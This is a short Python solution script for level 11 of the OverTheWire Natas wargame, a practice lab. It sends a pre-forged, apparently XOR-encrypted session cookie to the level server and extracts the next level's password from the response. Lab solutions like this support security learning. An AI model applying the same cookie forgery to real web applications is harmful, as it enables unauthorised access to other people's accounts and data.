import requests
import re
from natas_utility import *
import html

current_level = 11
credentials = get_credentials(current_level)

base_url = 'http://{}.natas.labs.overthewire.org'.format(credentials['username'])
auth = (credentials['username'], credentials['password'])

session = requests.session()

url = base_url
cookies = {'data': 'ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK'}

response = session.get(url, auth=auth, cookies=cookies)

content = html.unescape(response.content.decode('utf-8')).replace('<br />', '\n')
cookies = response.cookies

# print(content)

password_regex = re.compile(r'The password for natas12 is (.+)<br>')
next_password = password_regex.findall(content)[0]
print(next_password)

save_credentials(current_level + 1, next_password)
